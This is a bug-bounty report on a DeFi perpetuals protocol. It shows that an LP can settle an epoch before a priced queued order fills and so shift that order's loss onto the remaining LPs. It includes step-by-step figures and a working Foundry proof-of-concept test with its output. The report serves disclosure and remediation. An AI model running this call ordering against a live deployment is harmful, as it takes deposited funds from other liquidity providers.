# \#99834 [SC-Critical] An LP with a matured request settles the epoch before a priced queued order fills, and the LPs who stay pay that order's result

**Submitted on Nov 15th 2026 at 12:39:52 UTC by @Audittens for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99834
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

LP shares are priced from the pool's value, so an LP who exits or enters at an epoch should take no value from the LPs who stay. A queued order's price is fixed at the first tick after its commit, so once that tick is published, the order's profit or loss against the pool is already decided. LP epoch settlement does not count it. Anyone can settle, and anyone can execute the order, so an LP whose request has matured picks the order of the two calls. A redeemer settles first when the queued order will cost the pool, and is paid as if it never happened. The LPs who stay then pay all of it.

## Vulnerability Details

`OrderRouter.settleLpEpoch` is open to anyone. It installs the caller's price tick as the Engine mark and settles the epoch at it:

[packages/perps/src/router/OrderLiquidationBatchLogic.sol:561-563](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L561-L563)
```solidity
IPletherOracle.PriceSnapshot memory snapshot =
    oracle.updatePrice{value: pythFee}(msg.sender, pythUpdateData, IPletherOracle.PriceMode.PoolReconcile);
host.engine().updateMarkPrice(snapshot.markPrice, snapshot.publishTime);
```

`HousePool._settleLpEpoch` then [checks only](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L809-L818) that the Router called it, that the mark is the Engine's and that the mark falls in the current epoch, reconciles, and [prices matured requests](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841) at the result. Nothing in this path reads the queue of committed orders.

A queued order is priced at the [first tick](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L610-L614) published after its commit, by design and not at the executor's tick, as SECURITY.md [states](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L647). When it executes after the settlement, it fills at that older price, and the Engine [keeps the newer mark](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L1058-L1060). The difference between the two is the trader's instant gain or loss against the pool, and it lands only on the LPs still in the tranche, because the redemption was already priced without it.

`settleLpEpoch` and `executeOrder` carry only `nonReentrant`, so one caller can run them in either order:

- A redeemer settles first when the order will gain against the pool, and executes first otherwise.
- A depositor settles first when the order will lose against the pool, so the new shares share in what the pool gains from it.

### Attack scenario

The setup uses the release risk parameters from `DEPLOYMENT.md`. Junior holds Alice with 20,000,000 USDG and Bob with 30,000,000 USDG. A holder is long 5,000,000 USDG.

1. Alice, past the 1-hour deposit cooldown, calls `TrancheVault.requestRedeem` for all her shares. The request matures at the next epoch boundary.
2. One second after the boundary, a trader calls `OrderRouter.commitOrder` for a 10,000,000 USDG short. Its first tick after the commit, two seconds later, prints 1.0000. The short moves the skew from 5,000,000 long to 5,000,000 short, so it pays no price-impact charge.
3. Ten seconds after the boundary the price is 1.0008, so the queued short will open 8,000 USDG in profit against the pool.
4. Alice calls `OrderRouter.settleLpEpoch` with the current tick. Her redemption is priced at 1.0008, without the queued short.
5. Alice, or any keeper, calls `OrderRouter.executeOrder` with the short's own tick. The short fills at 1.0000, the mark stays at 1.0008, and the trader's 8,000 USDG gain lowers Junior's value, which only Bob holds now.
6. Alice calls `TrancheVault.claimRedeem` and receives 20,002,599 USDG instead of 19,999,399 USDG when the order executes first. Bob's shares are worth 29,995,900 USDG instead of 29,999,099 USDG. Alice gains 3,199 USDG, and Bob loses 3,199 USDG.

With the price 8 bps lower instead, a new LP, Carol, with a matured 20,000,000 USDG Junior deposit, settles first and then executes. Her shares are worth 20,002,285 USDG instead of 20,000,000 USDG, 2/7 of the trader's 8,000 USDG loss, taken from Alice and Bob.

## Impact Details

Direct theft of user funds. A Junior LP with a matured redemption is paid without a queued order's loss to the pool, and the Junior LPs who stay pay it from their deposits. In the test, a 20,000,000 USDG redemption takes 3,199 USDG from a 30,000,000 USDG LP who does nothing. A matured depositor does the same in the other direction and takes 2,285 USDG.

The LPs who stay lose deposited USDG, and the loss is final once the redemption is claimed. Per epoch, the shift is the settling LP's share of the tranche times the queued order's size times the move between its fill tick and the settlement tick. With no move, the order of the calls changes nothing, so the whole shift comes from the price gap.

Conditions:
- The attacker needs its own matured Junior request. Senior is protected by its high-water mark.
- Another trader's order must be queued with its fill tick already published, and the attacker's settlement must be the epoch's first. The fill tick comes within 15 seconds of the commit, and the order stays executable for up to `maxExecutionWindowSeconds`, 60 seconds by default.
- The attacker must settle before a keeper executes the order. The scale treats keepers as untrusted and lets any caller choose the order of calls, so this is in scope; the race only lowers the reward.
- The amount per epoch is a few bps of the queued order's notional times the attacker's share of Junior. It costs only gas and the Pyth fee.

This is not the known "Order execution accepts oracle updates older than the engine's cached mark", from the [AI scan](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md?plain=1#L1196). That item is a trader keeping an older tick to fill against the pool, and the trader's gain here is the same in both orderings. Filling at the first tick after commit is the intended pricing, so an executed order will usually be older than the latest mark. The defect is in LP settlement, which prices exits and entries while such an order is pending, and moves the order's result between LPs. Fixing it means accounting for queued orders at settlement, not changing how orders are priced.

It is also not the known limitation on [basket component selection](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L687-L699), where the settling caller picks among valid marks. Here the settlement mark is the current one, and what settlement leaves out is the queued order.

The price-impact charges and rebates of queued orders shift value between LPs in the same way, but this report claims only the price gap: the test's order pays no such charge.

## Recommended Mitigation

Account for queued orders at settlement. `settleLpEpoch` can revert while an order whose fill tick is already published is still queued, so the order executes first; or it can execute those orders itself before pricing matured requests. Either way the settlement mark and the fills agree, and the order of the calls no longer decides which LPs bear an order's result.

## References

- [OrderLiquidationBatchLogic.sol:549-581](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L549-L581)
- [HousePool.sol:797-841](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L797-L841)
- [OrderRouterExecutionSidecar.sol:1053-1061](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L1053-L1061)

## Proof of Concept

The tests use the release risk parameters from `DEPLOYMENT.md`, including the price-impact charge and carry. Orders go through `OrderRouter.commitOrder` and `OrderRouter.executeOrder`, and the epoch is settled through the permissionless `OrderRouter.settleLpEpoch`, all with signed basket ticks at the times the scenario gives. After step 3 the redeemer test saves the state and plays out the fair order (the queued short executes first, then the epoch settles), then reverts and plays out the attack, so Alice's and Bob's results can be compared. The depositor test does the same for Carol's deposit with the price 8 bps lower.

Paste the code into `test/POC.t.sol` at the repository root and run:

```bash
forge test --match-path test/POC.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../packages/perps/test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console} from "forge-std/console.sol";

contract Test is BasePerpTest {

    address internal alice = makeAddr("alice"); // Junior LP with a matured redemption
    address internal bob = makeAddr("bob"); // Junior LP who does nothing
    address internal carol = makeAddr("carol"); // new LP with a matured Junior deposit, second test only
    address internal holder = makeAddr("holder"); // holds the 5,000,000 USDG long
    address internal trader = makeAddr("trader"); // commits the 10,000,000 USDG short
    address internal keeper = makeAddr("keeper");

    /// @dev Release risk parameters from DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_redeemerSettlesBeforeQueuedOrder() public {
        _setUpPool();

        // Step 1: Alice, past the deposit cooldown, requests to redeem all her shares.
        _at(juniorVault.lastDepositTime(alice) + juniorVault.DEPOSIT_COOLDOWN() + 1);
        uint256 aliceShares = juniorVault.balanceOf(alice);
        vm.prank(alice);
        uint256 requestId = juniorVault.requestRedeem(aliceShares, alice, alice);
        uint256 boundary = pool.lpEpochStart(requestId);

        // Step 2: one second after the boundary, the trader commits a 10,000,000 USDG short. Its first tick after
        // the commit, two seconds later, prints 1.0000.
        (uint64 shortOpen, bytes[] memory fillTick) = _queueShort(boundary);

        // Step 3: ten seconds after the boundary the price is 1.0008, so the short will open 8,000 USDG in profit.
        _at(boundary + 10);
        bytes[] memory currentTick = _tick(1.0008e8, boundary + 10, boundary + 3);

        // For comparison: the order executes first, then the epoch settles.
        uint256 snapshot = vm.snapshotState();
        _execute(shortOpen, fillTick);
        router.settleLpEpoch(currentTick);
        uint256 alicePaidIfOrderFirst = _claimRedeem(requestId, aliceShares);
        uint256 bobValueIfOrderFirst = juniorVault.convertToAssets(juniorVault.balanceOf(bob));
        vm.revertToState(snapshot);

        // Step 4: Alice settles the epoch with the current tick. Her redemption is priced without the queued short.
        vm.prank(alice);
        router.settleLpEpoch(currentTick);

        // Step 5: the short executes with its own tick and fills at 1.0000; its gain lowers Junior's value.
        _execute(shortOpen, fillTick);

        // Step 6: Alice claims her redemption.
        uint256 alicePaid = _claimRedeem(requestId, aliceShares);
        uint256 bobValue = juniorVault.convertToAssets(juniorVault.balanceOf(bob));

        console.log("Alice paid, order first (USDG):           ", alicePaidIfOrderFirst / 1e6);
        console.log("Alice paid, Alice settles first (USDG):   ", alicePaid / 1e6);
        console.log("Alice gain (USDG):                        ", (alicePaid - alicePaidIfOrderFirst) / 1e6);
        console.log("Bob's shares, order first (USDG):         ", bobValueIfOrderFirst / 1e6);
        console.log("Bob's shares, Alice settles first (USDG): ", bobValue / 1e6);
        console.log("Bob loss (USDG):                          ", (bobValueIfOrderFirst - bobValue) / 1e6);

        assertGt(alicePaid, alicePaidIfOrderFirst, "Alice gains");
        assertLt(bobValue, bobValueIfOrderFirst, "Bob loses");
    }

    /// @dev The same pool and the same queued short, with the price 8 bps lower instead. Carol's matured deposit
    ///      is priced before the short's loss reaches the pool, so her new shares take part of it.
    function test_depositorSettlesBeforeQueuedOrder() public {
        _setUpPool();

        // Carol requests a 20,000,000 USDG Junior deposit. The request matures at the next epoch boundary.
        settlementToken.mint(carol, 20_000_000e6);
        vm.startPrank(carol);
        settlementToken.approve(address(juniorVault), 20_000_000e6);
        uint256 requestId = juniorVault.requestDeposit(20_000_000e6, carol, carol);
        vm.stopPrank();
        uint256 boundary = juniorVault.depositEpochStart(requestId);

        // The same short is queued and priced at 1.0000. Ten seconds after the boundary the price is 0.9992, so
        // the short will open 8,000 USDG in loss.
        (uint64 shortOpen, bytes[] memory fillTick) = _queueShort(boundary);
        _at(boundary + 10);
        bytes[] memory currentTick = _tick(0.9992e8, boundary + 10, boundary + 3);

        // For comparison: the order executes first, then the epoch settles.
        uint256 snapshot = vm.snapshotState();
        _execute(shortOpen, fillTick);
        router.settleLpEpoch(currentTick);
        uint256 carolValueIfOrderFirst = _claimDepositValue(requestId);
        vm.revertToState(snapshot);

        // Carol settles the epoch first, and the short executes after it.
        vm.prank(carol);
        router.settleLpEpoch(currentTick);
        _execute(shortOpen, fillTick);
        uint256 carolValue = _claimDepositValue(requestId);

        console.log("Carol's shares, order first (USDG):         ", carolValueIfOrderFirst / 1e6);
        console.log("Carol's shares, Carol settles first (USDG): ", carolValue / 1e6);
        console.log("Carol gain (USDG):                          ", (carolValue - carolValueIfOrderFirst) / 1e6);

        assertGt(carolValue, carolValueIfOrderFirst, "Carol gains");
    }

    /// @dev Junior holds Alice with 20,000,000 USDG and Bob with 30,000,000 USDG. A holder is long 5,000,000 USDG.
    function _setUpPool() internal {
        _fundJunior(alice, 20_000_000e6);
        _fundJunior(bob, 30_000_000e6);
        _fundTrader(holder, 2_000_000e6);
        uint64 holderLong = _commit(holder, CfdTypes.Side.LONG, 5_000_000e18, 1_000_000e6);
        _at(vm.getBlockTimestamp() + 2);
        _execute(holderLong, _tick(1e8, vm.getBlockTimestamp() - 1, vm.getBlockTimestamp() - 2));
    }

    /// @dev One second after the boundary the trader commits a 10,000,000 USDG short. Its first tick after the
    ///      commit, two seconds later, prints 1.0000.
    function _queueShort(
        uint256 boundary
    ) internal returns (uint64 shortOpen, bytes[] memory fillTick) {
        _at(boundary - 20);
        _fundTrader(trader, 600_000e6);
        _at(boundary + 1);
        shortOpen = _commit(trader, CfdTypes.Side.SHORT, 10_000_000e18, 500_000e6);
        fillTick = _tick(1e8, boundary + 3, boundary);
    }

    /// @dev Carol claims her new shares; returns what they are worth.
    function _claimDepositValue(
        uint256 requestId
    ) internal returns (uint256) {
        uint256 claimable = juniorVault.claimableDepositRequest(requestId, carol);
        vm.prank(carol);
        uint256 shares = juniorVault.claimDeposit(requestId, claimable, carol, carol);
        return juniorVault.convertToAssets(shares);
    }

    function _at(
        uint256 timestamp
    ) internal {
        vm.warp(timestamp);
        vm.roll(block.number + 1);
    }

    function _claimRedeem(
        uint256 requestId,
        uint256 shares
    ) internal returns (uint256 paid) {
        uint256 before = settlementToken.balanceOf(alice);
        vm.prank(alice);
        juniorVault.claimRedeem(requestId, shares, alice, alice);
        paid = settlementToken.balanceOf(alice) - before;
    }

    /// @dev A signed basket tick at `price`, published at `publishTime`, whose previous tick was at `prevPublishTime`.
    function _tick(
        uint256 price,
        uint256 publishTime,
        uint256 prevPublishTime
    ) internal pure returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, prevPublishTime)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _execute(
        uint64 orderId,
        bytes[] memory priceData
    ) internal {
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, priceData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executes");
    }

    /// @dev The account commits an open through `OrderRouter.commitOrder`.
    function _commit(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal returns (uint64) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: side == CfdTypes.Side.LONG ? 1 : type(uint256).max,
            isClose: false,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        return router.commitOrder(request);
    }

}
```

Output:

```
Ran 2 tests for test/POC.t.sol:Test
[PASS] test_depositorSettlesBeforeQueuedOrder() (gas: 8895040)
Logs:
  Carol's shares, order first (USDG):          19999999
  Carol's shares, Carol settles first (USDG):  20002285
  Carol gain (USDG):                           2285
[PASS] test_redeemerSettlesBeforeQueuedOrder() (gas: 8679779)
Logs:
  Alice paid, order first (USDG):            19999399
  Alice paid, Alice settles first (USDG):    20002599
  Alice gain (USDG):                         3199
  Bob's shares, order first (USDG):          29999099
  Bob's shares, Alice settles first (USDG):  29995900
  Bob loss (USDG):                           3199

Suite result: ok. 2 passed; 0 failed; 0 skipped
```
